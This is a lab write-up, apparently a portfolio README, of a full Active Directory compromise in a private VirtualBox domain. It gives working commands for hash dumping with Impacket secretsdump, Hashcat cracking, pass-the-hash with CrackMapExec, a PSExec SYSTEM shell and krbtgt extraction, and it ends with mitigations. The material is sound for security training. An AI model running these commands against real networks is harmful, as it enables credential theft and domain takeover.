# Active Directory Lab – Full Domain Compromise

## Overview

Full Active Directory attack chain against a self-built lab environment. This lab covers AD environment setup, network enumeration, credential attacks, hash dumping, Pass-the-Hash, and domain compromise via SYSTEM shell on the domain controller.

**Attacker:** Kali Linux (192.168.56.102) | **Domain Controller:** DC01 (192.168.56.10) | **Client:** WIN11-Client (192.168.56.20)

**Domain:** lab.local | **Environment:** VirtualBox Host-Only Network

**Attack Path:**

Network Enumeration → SMB Enumeration → User Enumeration → Hash Dumping → Hash Cracking → Pass-the-Hash → PSExec SYSTEM Shell → krbtgt Extraction

---

## Lab Setup

Built a full Active Directory environment from scratch:

- Windows Server 2022 deployed and promoted to Domain Controller
- Domain: lab.local created
- Organizational Unit: Users_Lab
- Users created: jsmith, jdoe, bjones
- Security Group: IT_Staff with all three users
- Windows 11 Enterprise client joined to domain

<img src="13_final_ad_proof.png" width="800">

---

## 1. Network Discovery

ARP scan identified all live hosts on the lab network.

<img src="01_ad_network_discovery.png" width="800">

---

## 2. Domain Controller Port Scan

Full TCP scan with service detection and default scripts confirmed DC01 as the domain controller for lab.local.

<img src="02_dc01_nmap_scan.png" width="800">

Key findings:

- Port 53 — DNS
- Port 88 — Kerberos
- Port 139/445 — SMB
- Port 389/3268 — LDAP
- Port 5985 — WinRM
- SMB Signing: Enabled

---

## 3. SMB Enumeration

CrackMapExec confirmed domain details and SMB access.

<img src="03_crackmapexec_smb_enum.png" width="800">

---

## 4. User Enumeration

All domain users enumerated using valid credentials.

<img src="04_crackmapexec_user_enum.png" width="800">

---

## 5. Share Enumeration

Domain shares enumerated. Administrator has READ/WRITE access to ADMIN$ and C$ confirming full administrative access.

<img src="05_crackmapexec_shares.png" width="800">

---

## 6. Hash Dumping – secretsdump

All NTLM password hashes extracted from the domain controller using Impacket secretsdump via the DRSUAPI method.

<img src="06a_secretsdump_top.png" width="800">

<img src="06b_secretsdump_hashes.png" width="800">

Hashes extracted:

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0dbf4b87c0bb3c0f514f9695d7593fb1:::
lab.local\jsmith:1103:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
lab.local\bjones:1104:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
lab.local\jdoe:1105:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
```

---

## 7. Hash Cracking – Hashcat

NTLM hash cracked offline using Hashcat with a custom wordlist.

```bash
hashcat -m 1000 2b576acbe6bcfda7294d6bd18041b8fe custom_wordlist.txt
```

<img src="07_hashcat_cracked.png" width="800">

**Result:** `2b576acbe6bcfda7294d6bd18041b8fe:Password123!`

---

## 8. Pass-the-Hash

Authenticated as Administrator using only the NTLM hash — no plaintext password required.

```bash
crackmapexec smb 192.168.56.10 -u Administrator -H 2b576acbe6bcfda7294d6bd18041b8fe
```

<img src="08_pass_the_hash.png" width="800">

**Result:** Pwn3d! — Full administrative access confirmed via hash alone.

---

## 9. SYSTEM Shell via PSExec

Obtained a SYSTEM level shell on the domain controller using Impacket PSExec with Pass-the-Hash.

```bash
impacket-psexec lab.local/Administrator@192.168.56.10 -hashes aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe
```

<img src="09_psexec_system_shell.png" width="800">

<img src="10_dc_system_proof.png" width="800">

<img src="11_whoami_system.png" width="800">

---

## 10. krbtgt Hash Extraction

The krbtgt account hash was extracted — this enables Golden Ticket attacks, which allow an attacker to forge Kerberos tickets and maintain persistent domain admin access even after password resets.

```bash
impacket-secretsdump lab.local/Administrator:'Password123!'@192.168.56.10 -just-dc-user krbtgt
```

<img src="12_krbtgt_hash.png" width="800">

```
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0dbf4b87c0bb3c0f514f9695d7593fb1:::
```

---

## Findings Summary

| Phase | Technique | Result |
|-------|-----------|--------|
| Network Recon | Nmap Full Port Scan | DC01 and all AD ports identified |
| SMB Enumeration | CrackMapExec | Domain info, users, shares confirmed |
| Credential Dumping | Impacket secretsdump | All NTLM hashes extracted |
| Hash Cracking | Hashcat NTLM mode | Password recovered offline |
| Pass-the-Hash | CrackMapExec PTH | Admin access without plaintext password |
| Remote Execution | Impacket PSExec | SYSTEM shell on domain controller |
| Persistence Risk | krbtgt extraction | Golden Ticket attack possible |

---

## Recommended Mitigations

- Enforce strong unique passwords across all accounts — weak passwords enable offline cracking
- Enable Protected Users security group to restrict credential caching
- Implement Credential Guard to protect NTLM hashes in memory
- Monitor for secretsdump and PSExec activity in Windows Event Logs
- Restrict SMB access and disable NTLM authentication where possible
- Rotate krbtgt password twice to invalidate any existing Golden Tickets
- Implement tiered administration model to limit lateral movement

---

## Skills Demonstrated

- Active Directory Environment Setup
- Network Enumeration (nmap, netdiscover)
- SMB Enumeration (CrackMapExec)
- NTLM Hash Dumping (Impacket secretsdump)
- Offline Hash Cracking (Hashcat)
- Pass-the-Hash Attack
- Remote Code Execution (Impacket PSExec)
- krbtgt Extraction and Golden Ticket Analysis
- Active Directory Privilege Escalation